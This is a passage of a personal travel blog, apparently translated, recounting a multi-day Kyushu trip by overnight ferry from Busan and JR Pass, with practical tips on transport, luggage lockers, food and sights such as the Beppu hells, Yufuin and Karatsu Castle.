open.The waiting area after exit is small, with a few duty-free shops and cafes (only this one sells food). I bought a tuna sandwich to fill my stomach.Bought some Korean Toms Gilim almonds (classic honey flavor, coated strawberry chocolate, tiramisu flavor) at the duty-free shop as souvenirs.After exiting, you can line up with your luggage first. Everyone lines up with their suitcases, ready to board the boat.About 90% are Korean.You can see Busan Port from the window. When it‚Äôs almost time, everyone will return to their luggage to get ready to board the ship.It takes about 15‚Äì20 minutes to walk and wait from the pier to boarding the ship.Shinshan CamelliaRoom 430, go up to the 4th floor to room 430 after boarding.The space is very small, accommodating up to 11 people. This time, it was a family group (3 people) + two couples (4 people) + me and my friend (2 people), so it wasn‚Äôt full; it seems they arrange people who speak the same language or are from the same country together (in this room, except for one couple from Hong Kong/Macau, the rest are Taiwanese). Each person has a small space, a hard pillow, a simple mattress, new bed sheets, and a quilt. First come, first served. Just got a corner seat, slightly bigger. There are two outlets (no adapter needed), allowing you to charge alternately. After settling the luggage around 20:00, the ship will start to depart at about 10:30.The 3rd floor has a restaurant, a small shop, and vending machines (all use Japanese yen). They sell slippers, toiletries, and hygiene products. The restaurant does not serve meals, so you can only buy instant noodles from the small shop or microwave meals from the vending machines. Therefore, it is recommended to bring food from Busan. Note: Meat products cannot be brought into Japan. Discard any leftovers. ‚ö†Ô∏èFortunately, I ate a sandwich before boarding, so I wasn‚Äôt very hungry and just bought some instant noodles to settle a meal. Note: Hot water is not available in the restaurant area; only a cold water dispenser is there. Hot water can be found in the pantry near the cabins at the aft of the ship. It took me a long time to find it. Also, be careful when operating the water heater. Turn on the switch first; water will not come out immediately, so wait a moment. Once water flows, handle it carefully. After use, make sure to turn it off tightly to prevent scalding the next person.After eating, go out to the deck for a stroll (free access, be careful of slippery floors).Around 21:00, another ferry (PUKWAN FERRY) heading to Xiaguan will depart first.Looking back at the night view of Busan Port Pier.Around 22:30, the ship will start leaving Busan Port, passing under the Busan Port Bridge. The night view of the bridge is very beautiful. (It will be cold, so dress warmly)The economy class cabin lights go off uniformly at 11 PM. After watching the departure, you can pretty much head back and lie down. Only the VIP room has a private bathroom; others share a common bathroom. The bathroom is a public bathhouse in Japan, where full nudity is required. There are small partitions in the washing area; since I was too shy, I didn‚Äôt bathe. The overall facilities are quite old but well maintained and clean. There is a recreation room and KTV. Public spaces will not have lights turned off. The internet connection lasts until around 11 PM after departure (it is said there is only a short period without internet). Approaching Tsushima Island means entering Japan, so you need to switch to a Japanese SIM card. There will be slight rocking and swaying while driving; those prone to motion sickness should consider taking motion sickness medicine. Good night, Busan.Day 3 Hakata, Yutoku Inari ShrineArrived in Busan around 5:30 AM, dormitory lights turned on simultaneously; went out on the deck to see the quiet early morning view of Hakata Port and Hakata Port Tower.Those who purchased breakfast can dine at the restaurant. We didn‚Äôt, so we took our time washing up, wandering around the deck, and packing up to get ready to disembark. Disembarkation will start uniformly at 07:30. Everyone will line up with their luggage at the 3F lobby exit as usual.Around 08:00 Complete Immigration in Japan and Exit Hakata Port International Terminal Reminder: Hakata Port does NOT support electronic customs clearance, so please make sure to fill out the arrival card and customs declaration form ‚ö†Ô∏èBuses to Hakata Station or the Tenjin area are available right outside. Although carrying large luggage on the bus is inconvenient, since this is the departure station, seats are always available. Most people also bring luggage, so it feels less awkward. Some passengers board at intermediate stops, but there aren‚Äôt many, so it‚Äôs fine. On weekday mornings, few people take the subway back to Hakata, so there‚Äôs no need to worry about awkwardness (Kyushu is just spacious!). Around 9:30, after dropping off luggage at the hotel, have breakfast with the Morning Shellfish Soup Set at the food court in Hakata Station department store to fill up, then pick up the JR Pass and the train ticket for Yufuin tomorrow morning. The JR Kyushu Pass still requires manual exchange at the counter. Please arrive early to line up for the exchange. If Hakata Station is too crowded, you can consider exchanging at nearby stations for a faster process!Yude Inari ShrineOriginally planned to visit Karatsu Castle, but after checking the JR limited express schedule, going to Yutoku Inari Shrine is faster and closer. Considering yesterday‚Äôs fatigue, decided to change the itinerary.Travel from Hakata to Kashima City - Hizen Kashima Station.After exiting, walk along the road on your left and wait at stop number 2 across the street. This differs from Google Map‚Äôs directions, which tell me to walk to Nakamutada Station to catch the train, about 500 meters away. Please note that I visited in June 2024, and the station may have changed over time.Yude Inari ShrineAfter getting off at Yude Shrine, walk backward to reach Omotesando.Not sure if it‚Äôs because on weekdays Omotesando and the shopping streets are almost empty, and very few shops are open.Walk straight ahead (about 15 minutes), and you‚Äôll reach the shrine.At the shrine entrance, the glass building behind houses an elevator. If you prefer not to walk up, you can take the elevator for a fee.Going up, there is a row of prayer wind chimes. When I visited, no one was around. As I passed by, a gust of wind made them ring loudly.Walk through the entire row of torii gates and beautiful blooming hydrangeas. Behind, you can hike up to Okunoin (about 200 meters, very steep and difficult).After the visit, return to the station and head back to JR.Compared the Oyashiro Shrine Sea Torii and Karatsu Castle, felt the Sea Torii was quite ordinary ( after all, I‚Äôve seen the famous Itsukushima Shrine‚Äôs sea torii ) and the transportation is inconvenient, so I plan to visit Karatsu instead.There was an error when changing trains. This small station has no electronic boards. After getting off, I saw the platform sign saying ‚ÄúFor Karatsu‚Äù and thought I should change trains there. However, when the time came, the train passed on another platform, and I missed boarding.After careful study, I realized that checking the box at the bottom right of the timetable shows the correct boarding platform. The platform may differ between weekdays and holidays.Because I missed the train to Karatsu and couldn‚Äôt return to the Oya Shrine‚Äôs sea torii gate, and after yesterday‚Äôs ordeal, I fortunately decided to go straight back to the Hakata hotel to rest. On the return trip, I noticed something interesting. I wondered why the train doors didn‚Äôt open at the small stations (I was sitting in the rear car). Upon closer observation, I found that at stations without staff, the conductor acts as the station staff. Passengers must get off from the first car and pay the fare by inserting coins or tapping a transit card on the screen (just like a bus). If using a JR Pass, simply show it to the driver. Also, a reminder: if you exit an unmanned JR station using a JR Pass, just walk out directly. Do not insert the JR Pass into the ticket collection box. ‚ö†Ô∏èAround 16:00 Return to Hakata, hotel Note that the washing machines at Toyoko INN may not provide detergent. Please check if the machine automatically dispenses detergent before washing‚ö†Ô∏è If not, you need to insert more coins or buy detergent at the counter. (30 yen)After putting the clothes into the washing machine, I went to the underground shopping area of Hakata Station‚Äôs department store to find something to eat.Bought a steak bento to eat, it was great; the tea and alcohol were okay, not much flavor.Also bought 1000 Yakult to drink at night, BRULEE caramel ice cream as dessert (very sweet!), and fried shrimp as a late-night snack (this time I really got whole fried shrimp, unlike the fake ones I bought in Kumamoto QQ).Laundry (30 mins), drying (1 hr), rest.Day 4 Yufuin, Oita Sample itinerary: KKday Japan Kyushu Fukuoka Oita One-day Tour | Dazaifu Tenmangu, Yufuin, Beppu Sea Hell &amp; Cooking Pot Hell | Departure from Hakata (Chinese, English, Japanese supported)Early in the morning, checked out and dragged luggage to JR Hakata Station to take the Yufu 1 to Yufuin. Suitcases can be placed in the luggage compartment. If you‚Äôre worried about sliding, you can place them horizontally. A cup of coffee to wake up the mind This season, the road is lush green but doesn‚Äôt have particularly beautiful scenery (or maybe only Yufuin no Mori has nice views?). Upon exiting Yufuin Station, immediately turn right to the Coin Lockers to store your luggage. Since these are suitcases, there are fewer available spots. (1,000 yen)Due to the season and weather, the overall tone felt gray and greenish when I visited, without any special impression.Walk straight down the street to reach Jinlin Lake, where the green lakeside reveals a touch of tranquility.Kinrin Lake is very clean and clear, with many maple leaves by the shore (not yet changed color).Along the street from Yufuin Station to Kinrinko Lake, there are many IP-themed and creative shops to explore. If you‚Äôre interested in food, you can also check out Yufuin‚Äôs award-winning desserts, including pudding, ice cream, and more.Of course, there are also the widely seen Totoro Forest, Jiikawa, and the ‚ÄúKyushu specialty‚Äù Kumamon.Yufuin Showakan has a strong traditional Japanese atmosphere.The Flower Village looked too touristy and crowded, so I didn‚Äôt go in to see it.Bought the famous pudding dorayaki and some souvenirs on the way (sesame powder, Yufuin Renga Workshop ‚Äî Seven Lucky Gods, cultural and creative items, Yufuin incense‚Ä¶) Side note: Surprisingly, I ran into a colleague in this hidden paradise of Yufuin XD ‚Äî Pinkoi Community QueenFor lunch, we originally planned to eat at Yufu Mabushi Shin, famous for Yufuin kamameshi. There are two locations: one at the Kinrinko main store and another at the station exit. The station exit branch was closed that day, and we were too lazy to walk back to the main store, so we opted to eat at the first-floor Sushi Gen instead.I had the Bungo beef steak, and my friend had the rice bowl; the beef was delicious, very flavorful and juicy, with little to no gamey taste, and the price was affordable.After eating and strolling around, it was about 15:00, so we took the bus to continue heading to Oita.There are many trains from Yufuin to Oita, and not many people (maybe more are returning to Hakata?). There are also local trains, so this time I took a local train directly and practiced the new Japanese I learned:Does this train go to Oita?Yes, it goes to Oita.16:20 OitaI happened to come across an art installation at Oita Station (it even makes sounds).Oita gives off a vibe of being far from the hustle and bustle. When wandering around the city, it feels unusually quiet, with only faint car engine sounds and very few people or vehicles.First, go to the hotel to drop off luggage. The layout of Toyoko INN hotels is quite similar. This time, I got a room with the exact same layout and angle as the one at Hakata Station Front yesterday. The difference is that this hotel‚Äôs bathroom is larger, and the hallway is narrower.The time was still early, so I decided to stroll around and casually opened Google Maps to check nearby attractions.Giant BougainvilleaOn the way to Oita Castle Ruins, there is a huge bougainvillea in the park parking lot (it looks like some kind of curse from Jujutsu Kaisen).Oita Castle RuinsOita Castle ruins only have the moat, walls, and courtyard remaining. Inside is an open parking lot and the castle tower platform, offering a view of Oita City.The official AR App lets you see what the old Funai Castle looked like.Wandering leisurely back to the station market to find food, the buses in Oita have a vintage feel but are well maintained.Not sure what to have for dinner, so I casually bought a pork cutlet rice and a Suntory non-alcoholic sparkling drink (delicious!). Japanese sauce packets are thoughtfully designed with a small corner for easy opening.Late-night snacks are strawberry smoothie ice cream, barbecue, and Kirin‚Äôs limited-edition pineapple sake (strong pineapple flavor, slightly sweet).Day 5 Beppu Hells, Beppu Sample itinerary: KKday „ÄêBeppu Yufuin One-Day Tour„ÄëNyoirinji Temple + Beppu Hells + Yufuin (Departing from Fukuoka) Kyushu Beppu Hell Hot Springs Tour | Regular Admission / Pre-sale Ticket | Instant UseIt takes about 15 minutes by JR Limited Express from Oita Station to Beppu Station. The scenery along the way is somewhat similar to the feeling of traveling from Hiroshima to Kure.Take the JR train and transfer to a bus to Beppu Hell Tour ‚Äî the first stop is Umi Jigoku (Sea Hell). You can follow the itinerary order shown in the above image. Want to visit all 7 hells? It‚Äôs cheaper to buy a full set of 7 tickets at the Sea Hell entrance. If time is limited, you can just visit the Sea Hell. Entry only requires tearing off a corner of the ticket and dropping it into the box. Each hell has a free rest area for soaking your feet. Hell SeaI think Hell Valley is the most spectacular, with its constantly boiling steam and deep blue spring water.There is a terrace and a small shrine at the back.The small blood pool on the other side is also quite unique.After leaving the Sea Hell, follow the instructions to reach the next Hell of the Stone Monk.Ghost Stone Monk HellMainly known for its mud volcanoes.Exit and follow the signs to the next hell.Kamado Jigoku (Cooking Pot Hell)The Milk Pond at Chinoike Jigoku feels great for soaking.But the unique feature of the Boiling Hell is not the spring itself, but the smoke. Staff use incense sticks and blow air onto the hot spring steam, which creates a large amount of smoke. It‚Äôs quite interesting (according to explanations, the incense particles attract more water vapor molecules, causing the smoke to gather).Another feature of Jigoku is the row of hot spring experiences, including rock plate foot baths, drinking hot spring water (which tastes slightly thick and salty), foot soaking, facial steaming, hand steaming, and throat steaming (similar to visiting a pediatrician in Taiwan XD).This area is more spacious with more activities to experience. Shops also sell some food, making it a good place to rest.You can see the sign to Ghost Mountain Hell right when you come out.Oniyama HellThe water in Oniyama Hell boils more violently, continuously surging outward.On the other side of the park is the crocodile enclosure.Follow the instructions and go straight down to reach the White Pond Hell.You will pass by the Hell Hot Spring Museum (caf√©), where you can take a break.Shiraike JigokuShiraike Jigoku is less distinctive and has a small tropical fish aquarium.The remaining Blood Pond Hell and Tornado Hell are not in this area and require taking a bus to reach.After exiting Shiraike Jigoku, walk straight down to the intersection and turn left. Then go ahead to Tetsurin Station No. 2 to wait for the bus.Blood Pond HellFirst, visit the Blood Pond Hell, which is similar to the small blood pond in the Sea Hell but on a larger scale.Going down leads to Tornado Hell.Tornado HellTornado Hell is an intermittent geyser that erupts every 30‚Äì40 minutes, lasting about 6‚Äì10 minutes each time. You can ask the staff at Tornado Hell (in our case, the staff proactively informed and assisted us). If an eruption is about to happen, you can wait to watch it; if not, you can visit Blood Pond Hell first.The smoke during the eruption forms a tornado, hence the name.GokurakuteiLunch was directly taken care of at the Blood Pond Hell Gokurakutei.I tried the famous Hell Paradise Curry, enjoying the Japanese-style distinct grains of rice paired with thick (mildly spicy) curry, served with grilled vegetables and chicken. It was flavorful without being greasy, smooth and refreshing.After eating, I found nearby attractions such as Kibune Castle, Juji-yama Observatory, Myoban Hell, and Yunohana‚Ä¶Kifune CastleOn the way back to Tielun 2 bus stop, I decided to visit Guifeng City. The city is small, and the view from the lookout is nice. However, walking from the bus stop and going uphill was tiring. J≈´jiyama Observatory, Myoban Jigoku, and Yunohana are actually located above Umi Jigoku; when re-planning your itinerary, you should first visit these spots, then go down to Umi Jigoku, and continue to Chinoike Jigoku and Tatsumaki Jigoku, or alternatively, start with Chinoike and Tatsumaki first.Cross Mountain Observation DeckReturn to Tetsurin 2 and take the bus via Umi Jigoku to the Jujiyama Observatory to view Beppu City; the sun is strong and hot, and the observatory only has restrooms, no shops or rest areas.The mountain opposite the entrance is lush and beautiful.Since it‚Äôs a night view, there‚Äôs not much to see in the morning‚Äîjust a lot of sun.Myoban HellGo back down to Myoban Hell. The ticket office is across the street at Okamotoya Pudding Shop. Just tell the staff you want to go across.You can enjoy a Hell Steamed Pudding before you leave.Yunohana Hut is used to dry hot spring water to obtain crystals. If you walk up to the Yunohana Shop, they sell this hot spring bath additive.Yuno Hana CottageBought some bath additives, face masks, and creams as souvenirs from the little shop Tang no Hana.Additionally, there is a Private Bath available for hot spring soaking. If you feel shy about using the public baths, you might consider trying this option.Around 4:00 PM, it‚Äôs time to take the bus back to the city.BeppuAfter arriving at Beppu Station, walk to Beppu Tower and casually explore along the way. (Statue in front of the station, old hot spring hall, Great Tengu)Beppu TowerBuy tickets from the vending machine on the first floor of Beppu Tower, take the elevator up, and enjoy a bird‚Äôs-eye view of Beppu‚Äôs coastal city area.Looking at the streets and cars from above is very soothing.There is a meteorite exhibition inside the tower. Besides Beppu Tower, you can also visit the cable car or the new Beppu - World Tower.The Beppu Tourism Bureau website also offers other itinerary suggestions :Beppu Tourism Bureau WebsiteHead back to the hotel to rest.Return to the hotel to rest, then go to Oita Station Market to buy dinner, a pork cutlet bento, and Oita-exclusive fruit wine (tasty, refreshing, and not too sweet).Dessert/late-night snack includes fried shrimp, instant noodles, white peach ice cream, and jasmine flower br√ªl√©e (I don‚Äôt like br√ªl√©e).Day 6 Shimonoseki, Karatsu KKday itinerary reference: Private day tour in Kitakyushu, Fukuoka, JapanÔΩúDazaifu Tenmangu Shrine, Mojiko, Karato Market, Kanmon Strait, Akama ShrineStarting from Oita to Kokura, then to Mojiko and Shimonoseki, Shimonoseki and Karatsu are about 140 km apart, and normally people wouldn‚Äôt travel this way; because on the first day in Japan, I took the wrong train and missed Karatsu, I really wanted to visit this spot, so I forced myself to do a one-day Shimonoseki-Karatsu trip like a march.Woke up late, around 8:40, took the JR Limited Express from Oita to Kokura. Planned to leave luggage in Kokura, then take a branch line to Mojiko.It started drizzling in the sky over Oita. Thinking back, every city I‚Äôve visited has experienced rain. (Definitely the rain god‚Äôs blessing)Arrived at Kokura Station around 10 AM. After searching for a long time, all self-service luggage lockers were full (a friend said there were spots at 9 AM). The manned luggage counter opens at 11 AM, so I had to carry my luggage and head straight to Mojiko to look for storage options.After exiting Mojiko Station, go directly to the left (no need to leave the building) to find the self-service Coin Lockers. This time, there were quite a few people at Mojiko, and all lockers were full; however, fortunately, the manned luggage storage counter had already opened, allowing me to successfully store my luggage (but the manned counter only operates until 8 PM! ‚ö†Ô∏è).I originally planned to eat at Moji Curry Yaki, which had no line last year and was easy to enjoy. But when I got out of the station and saw a long queue, I gave up and turned right to wait at the Mojiko bus stop for a bus to Shimonoseki.ShimonosekiGet off at the underground pedestrian walkway at Shimonoseki Station. This time, view the Kanmon Bridge from a different angle. The right side of the photo shows the view from last year at the Moji Port Retro Observation Room (../d78e0b15a08a/).Here is the Wakamiraki Shrine torii gate, with Wakamiraki Shrine and the Wakamiraki Shrine observatory on the mountain behind.Take the elevator from the sidewalk entrance down to B1, which is the pedestrian area. Entry is free for people, but bicycles are charged a 20 yen toll. Also, watch out for wild boars in this area XDThe full length is 780 meters, straight all the way through, with a dividing line in the middle.After exiting the Shimonoseki checkpoint, there are shops selling simple snacks. I bought a takoyaki to fill my stomach. (The inside is chewy, the skin is crispy, and it really has octopus‚Äîdelicious!)From the opposite side, looking at the Kanmon Bridge and Mojiko Retro Observation Room, it feels like the view from Bali, Taiwan, looking toward Tamsui.Hiking along the coast all the way to Karato Market.On the way to Karato Market, you will pass by Akama Shrine, so it‚Äôs convenient to stop by for a visit.Many people buy food and picnic by the coast outside Karato Market. Although there are many people, it remains very clean. Since I was mainly scouting the area and don‚Äôt eat much raw food, I didn‚Äôt go inside. Around noon, it looked quite crowded inside.Crossing the Karato Market leads to the pier where you can take a ferry directly back to Mojiko. Just buy a ticket from the automatic ticket machine at the shops across the pier. If you have time, you can also visit Ganryu Island (the famous duel site!) for a stroll.It takes about 10 minutes to reach Mojiko. (It really feels like the Tamsui Bali ferry!)Back in Mojiko, it started to drizzle. I already visited Mojiko last year, so I didn‚Äôt stay long and prepared to go to the station to get my luggage and head to Kokura and Hakata.The time was around 14:00, and I planned to reach Karatsu Castle by about 4:30. Every second counted, so I used my New Taiwan Dollars (Japanese Yen) in Kokura to buy a ticket for the Sanyo Shinkansen from Kokura to Hakata, the world‚Äôs fastest train running at 300 km/h. It only takes 15 minutes to arrive (JR Limited Express takes 45 minutes, local trains take 65 minutes). The JR Pass for Kyushu does not cover the Sanyo Shinkansen (Kokura to Hakata section). For Nozomi and Mizuho trains, you must buy tickets separately at the Shinkansen platform. Using the JR Pass will be denied. Even if you enter and exit, you must pay the fare difference ( based on my previous experience ). ‚ö†Ô∏èIt takes about 20 minutes to walk from JR Karatsu to Karatsu Castle. The express bus stops at Karatsu Castle-maebashi, so I decided to take the express bus. (Also my first time riding it!)After arriving at Hakata, take the subway directly to Tenjin-Minami and store your luggage in the underground shopping area. (Luckily, I found the last luggage spot at number 2)From Exit West 8 of Tenjin Chikagai, follow the signs at Fukuoka Mitsukoshi Department Store to the 3rd floor of Tenjin Expressway Bus Terminal to reach the bus station.Since I was unsure about reserving a seat or buying a ticket, I went directly to the counter to purchase the ticket; after buying the ticket, I was very hungry, so I grabbed a bread at Starbucks and went to the designated platform to queue for the train. (I later found out that no seat reservation is needed for the train to Tangjin, and you can use a transportation card, just like taking a bus; the fare is fixed at 1,100 yen regardless of the stop.)15:02 Boarded the express bus to Tangjin (Baodang Pier), with about 80% occupancy.The image on the right shows last year‚Äôs view of this road from Fukuoka Tower. This year, the view is from this road looking at Fukuoka Tower. (A kind of time-space overlap feeling)Mainly Japanese commuters, after passing through Karatsu city, I was the only one left on the train. I was going all the way to the last stop ‚Äî Bodou Pier.Karatsu KKday Private Car Tour Reference: ‚Äú„ÄêFukuoka Private Car One-Day Tour„ÄëKyushu Fukuoka Prefecture, JapanÔΩúFukuoka Tower, Dazaifu Tenmangu Shrine, Ohori Park, Karatsu, Sakurai Futamigaura, Yobuko Morning Market, Itoshima, Tenjin Underground Shopping MallÔΩúFlexible Itinerary!‚ÄùAfter getting off, walk a little forward to reach Bodang Pier. Continue walking back along the path to Tangjin Castle. Seeing this front bridge and rear castle view makes all the travel worthwhile.Arrived here around 16:35, with only 25 minutes left before Karatsu Castle closes. Since I was already here, I decided to take a walk.To reach Karatsu Castle, you need to walk up a slope below. Due to limited time, turn left directly to Maizuru Park next door and take the elevator up.Taking the elevator costs 100 yen per ride. Buy a ticket from the vending machine at the entrance and give it to the staff.The main keep is closed to visitors; just came up to enjoy the view and see Karatsu Castle.Return to the entrance before the elevator doors close, and follow the sightseeing map to walk back to JR Karatsu Station.Take the Ishigaki Road to Karatsu Shrine first. (The road is sparsely populated and desolate)Karatsu Shrine (closed after 17:00), Old Karatsu Bank (designed by the same architect as Tokyo Station ‚Äî Kingo Tatsuno).Near the station is the Yatai Exhibition Hall (closed after 17:00), so you can only see small models at the station. At Karatsu Station, take the JR back to Hakata (Tenjin-Minami); encountered a problem when exiting because the entry was at JR Karatsu Station and exit at Tenjin-Minami subway station. The staff did not accept the JR Pass and demanded a full fare ticket from JR Karatsu to Tenjin-Minami QQ.It was pouring rain in Hakata (the rain god was powerful). I randomly bought a rice ball at Tenjin Underground Shopping Mall for dinner and then dragged my luggage to the hotel. This APA location offers more space, but the facilities are generally outdated. It‚Äôs also my first time staying at an APA without a unit bath, and it lacks a hot spring bath and smart features (like checking the washing machine, Airplay, etc.).Snack is strawberry smoothie, late-night snack is convenience store fried chicken, Qiuyah (so sweet).End of a long day.Day 7 Sasebo (Kujukushima), Takeo OnsenIt was cloudy in the morning, and it was already the last day of the JR Pass. Unable to change the itinerary, I had to continue taking the train to Sasebo.The JR train ride takes about an hour and a half. I recorded a segment of the JR Kyushu onboard announcement as a memory.The last section from Haiki to Sasebo will be driven in reverse (about 10 minutes). If you are prone to motion sickness, you can use your foot to switch the seat direction.After leaving Sasebo Station, cross the street to the opposite side, then walk back to find bus stop No. 6, heading to ‚ÄúKujukushima Aquarium.‚ÄùAfter transferring to the bus and getting off at Kujukushima Aquarium Station, it‚Äôs about a 5-minute walk to the Kujukushima Cruise Visitor Center, where you can buy tickets for the boat tour. (Showing a JR Pass gives you a discount) KKday Online Ticket: Nagasaki, Kyushu Japan | Kujukushima Sightseeing Cruise TicketKujukushima Sightseeing BoatOfficial Kujukushima Website InformationThis time, I took the white Pearl Queen ship on the left at 11:00.Heavy rain and bad weather prevent me from becoming a pirate king. I can only hold an umbrella, feel the wind, and get soaked in the rain. The ship provides announcements in Chinese, English, Japanese, and Korean. The trip takes about 50 minutes. Restrooms and a snack bar are available on board. You can go from the cabin to the deck and the birdwatching platform, but we didn‚Äôt go up that day due to heavy rain and strong winds. The wind is especially strong when the boat passes between the two islands, so be careful.There are seats inside the cabin.After finishing the tour in the heavy rain without seeing much, we headed straight back to Sasebo.On the way back, stop by Bee House to taste the famous Sasebo lemon steak.Lemon steak consists of four thin slices of steak, sauce, lemon slices, and lemon juice. It has a refreshing taste but the meat portion is slightly small.After finishing, we ordered another specialty, the fruit cream puff. It was filled generously, with real fruit pieces inside.After eating, I took a stroll through the shopping street and then took the bus back to the station.Taking the train back (towards Hakata, Takeo Onsen), this is the last station, so you have to wait for the cleaning staff to finish before boarding; just like on the way here, the train will run in reverse from Haiki to Sasebo.The current time is about 13:30. You can also visit Huis Ten Bosch in Sasebo, but I didn‚Äôt specifically plan to go. KKday Sasebo Reference Itinerary: Japan Nagasaki | Kyushu Huis Ten Bosch Ticket Huis Ten Bosch Japan Nagasaki | Sasebo Military Port Yacht Tour „ÄêSasebo„ÄëShore Excursion | Resorts World One Kujukushima Aquarium Saikai Admission + Pearl Bead Stringing Experience (Includes Pearl) (Sasebo City, Nagasaki Prefecture)Takeo Onsen KKday Tour Reference: ‚ÄúKyushu Saga One-Day Tour | Yutoku Inari Shrine, Ureshino Onsen, Mifuneyama Rakuen, Takeo Library &amp; Takeo Shrine / Tosu Premium Outlets | Departing from Fukuoka Hakata‚ÄùLast time I traveled to Nagasaki and changed trains at Takeo Onsen, I didn‚Äôt have much impression of the station. Later, I followed Takeo City‚Äôs Tourism IG (the official account regularly holds events, such as free firefly shuttle services. If you‚Äôre planning to stay at Takeo Onsen, you can follow it). This time, I thought since I was passing by and had time, I would check it out.From Takeo Station (an unmanned station, no need to use JR Pass, just exit directly), the street outside is also sparsely populated and very quiet.Just passing by and taking a quick look, only visited the main attractions I found. They happened to be diagonal from each other. Since the bus frequency was low and I didn‚Äôt want to wait, I walked directly.First, go to Takeo Shrine. On the way, you will pass Tsukazaki Giant Camphor Tree, a small scenic spot.Tsukazaki Great Camphor Tree, estimated to be 2,000 years old.Takeo ShrineFrom below, walk up a short flight of stairs to reach Takeo Shrine.Next to Takeo Shrine, pass through the sacred tree torii and walk about 5 minutes further to see the legendary Takeo Great Camphor Tree. (Estimated age: 3,000 years)Takeo Great Camphor Tree is fenced off and can only be viewed from a distance.Bought a Takeo Shrine Great Camphor Amulet (1,500 yen), larger size with a wooden box.After visiting Takeo Shrine, I headed back to see the entrance gate of Horai-yu on the other side. The entire hot spring street was empty, with several hot springs and hotels to choose from (not necessarily Horai-yu). If you want a quiet, less crowded place with convenient transportation for hot springs in Kyushu, Takeo Onsen is a great choice!Penglai Hot Spring Entrance GateJust visited.After entering the building, you‚Äôll find the Penglai hot spring bath. On the other side, there is the hot spring accommodation, Sagi no Yu.Takeo City Tourist Map: I found information about Mifuneyama Rakuen, which looks nice, but it was already around 15:30, so there wasn‚Äôt enough time to visit.Take the limited express bound for Hakata and arrive at Hakata around 18:00.Strolling back to the hotel, dinner was casually picked up at a convenience store: rice balls, pork cutlet sandwich, Fujiya peach soda (delicious!!); after staying many times at APA and Toyoko Inn, I finally noticed they all have ice machines‚Äîso awesome!Except for the old equipment, the room size and view at this APA are really good.Day 8 Sakurai Futamigaura Meoto Iwa, Nanzoin Temple, Hakata PilgrimageJR Pass is no longer available. KKday Private Car Tour Reference: ‚Äú„ÄêFukuoka Private Car One-Day Tour„ÄëKyushu Fukuoka Prefecture, JapanÔΩúFukuoka Tower, Dazaifu Tenmangu Shrine, Ohori Park, Karatsu, Sakurai Futamigaura, Yobuko Morning Market, Itoshima, Tenjin Underground Shopping MallÔΩúFlexible Itinerary!‚ÄùSakurai Futamigaura Meoto Iwa (Married Couple Rocks)After checking out of the hotel early in the morning, I took the JR train to Kyudai-Gakken-Toshi Station.On the left side after exiting is the platform for the ‚ÄúNishi-no-Ura Line,‚Äù where staff are available to assist. The ride takes about 30 minutes.The fare is the highest bus fare I have ever paid, 730 yen.After getting off the car, you will arrive at Sakurai Futamigaura, the Meoto Iwa (Married Couple Rocks).Up close, it is beautiful and peaceful. After finishing here, you can continue to Sakurai Shrine (said to attract many fans because it shares the name with a member of the Japanese group Arashi) or go further to the Keya Gate Sightseeing Boat (looks very cool!).Return timetable: Direct trains to Hakata run every hour in the afternoon, and trains to Kyudai-Gakken-Toshi Station run every hour.Back in Hakata around 12:30 PM, first head out to find some food.Revisit Hakatamiyachiku (Japan‚Äôs No.1 Miyazaki Beef Specialty Store Hakata Miyachiku) Tasting Miyazaki beef business lunch.Business lunch offers great value (dinner features premium yakiniku set meals) + private rooms perfect for those with social anxiety.This time I ordered the lean meat set, 200g for 3,200 yen, and devoured two bowls of white rice (rice soup refills are free).Nan Zang TempleAfter returning to Hakata, take the train to Minami Zoin-mae Station.Exit the station and walk straight. Pass by Arashin Teahouse (a place to rest and have lunch), then cross the road to reach the entrance of Nanzoin Temple. Walk on the right to see the Reclining Buddha; on the left, there are statues for seeking love, safety, and Fudo Myo-o. Nanzang Temple is a private institution and also has enshrined memorial tablets, so there are many rules and restricted areas where photography is prohibited. Please comply with these regulations.No short sleeves, shorts, exposed midriffs or shoulders; no playing music, dancing, or photography (e.g., the row of memorial tablets at the entrance cave, the Fudo Myo-o statue). After entering the platform, you can see the Reclining Buddha statue. There are scriptures on the soles of the feet, making the whole scene grand and solemn.After the visit, I took the train back to Hakata Station, arriving around 15:40.Hakata PilgrimageAdd some places not visited last time in Kyushu.Gion ‚Äî Tochoji TempleOn the second floor of Tochoji Temple, you can visit and pray to the Fukuoka Great Buddha (50 yen).After the visit, it‚Äôs 5:00 PM, and the iron skillet fried dumplings at ÈâÑ„Å™„Åπ are still open for another hour. Then, go for a walk at Ohori Park.Ohori ParkOhori Park is very large, and walking around it takes about 45 minutes; you can also ride swan boats.Fukuoka City Museum of Art is closed on Mondays, so you can only admire Yayoi Kusama‚Äôs pumpkin from afar.After finishing the tour, it‚Äôs about 17:00, time to go for dinner!Iron Pan Fried Dumplings Tetsunabe ÈâÑ„Å™„ÅπI tried the iron skillet fried dumplings ÈâÑ„Å™„Åπ once before and still miss the crispy taste of those dumplings. He has another branch ‚Äî ÈâÑÈçãÁÖéÈ§É ÈâÑ„Å™„Åπ ÂçöÂ§ö Á•áÂúíÂ∫ó, which I passed by a few days ago. The door was locked, and a notice said it was under renovation and to visit the main store. (However, Google Maps still shows it as open) Sauces and water are self-service. The store does not support electronic payments and only accepts cash. ‚ö†Ô∏èAround 17:20, seeing everyone waiting outside, the shop assistant grandma came out shortly to invite us in.This time we knew to order two plates of fried dumplings. Last time, grandma gestured that one plate wasn‚Äôt enough (I didn‚Äôt understand then). One plate has 8 pieces (500 yen), so two plates have 16 pieces. We also ordered a draft beer to finish this round!Pan-fried dumplings are made to order and sizzle when served. The skin is thin and crispy, and the filling is likely chive and pork, simple and not salty, highlighting the natural flavors of the ingredients.After finishing at 18:00, some people had already started lining up outside.After eating, I walked back to the hotel and passed by the Nakasu food stalls being set up. This time, I noticed many more shared bikes. Changing hotels all the time this trip is exhausting; this is the hotel for the last three days.Snack ice cream, and the late-night meal is convenience store hot dogs.Day 9 KKDAY Takachiho One-Day Tour: Takachiho Shrine, Takachiho Gorge, Amano Iwato Shrine, Amano YasugawaraDirect booking for the ‚Äú„ÄêPrivate Tour, Daily Departure„ÄëKyushu One-Day TourÔΩúTakachiho Gorge &amp; Amanoiwato Shrine &amp; Amano-Yasugawara (Including Special Aso Akaushi Grilled Beef Set)ÔΩúDeparting from Fukuoka‚Äù itinerary. Other departure locations (Kumamoto) or combined with other attractions (Aso, Minami Aso, Shirakawa Spring) can refer to other KKday tours.07:45 AM Head to Hakata Station Chikushi Exit (Hakata Back Exit)In the plaza in front of LAWSON Hakata Station Chikushi Exit Store, find the day tour guide for your destination. (At the same time, there will be several groups, including those led by 